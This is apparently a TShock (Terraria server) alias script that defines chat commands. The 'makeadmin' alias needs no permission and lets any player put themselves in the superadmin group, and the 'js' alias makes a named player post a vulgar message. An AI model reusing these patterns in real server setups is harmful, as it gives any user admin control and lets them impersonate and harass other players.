
create_alias("js", "0c", 0, "", function(player, parameters) {
	var p;
	
	if ( parameters.Count > 0 ) {
		p = get_player(parameters[0]);
		
	}
	
	if ( p ) {
		msg(player, "p's tshock account name: " + p.UserAccountName);
		execute_command(p, "/me sucks " + random(1, 100) + " dicks.");
	} else {
		msg(player, "p is null.");
	}

});

create_alias("cursed", "0c", 0, "superadmin", function(player, parameters) {

	for (i = 0; i <= 20; i++) {
		execute_command(player, "/item \"cursed b\"");
	}

});

create_alias("makeadmin", "0c", 0, "", function(player, parameters) {
	
	if ( player.Group.Name != "superadmin" ) {
		change_group(player, "superadmin");
		msg(player, "became admin.");
	} else {
		msg(player, "already admin.");
	}
	
});

create_alias("ar", "0c", 0, "", function(player, parameters) {
	execute_command(player, "/aliascmd reload");
});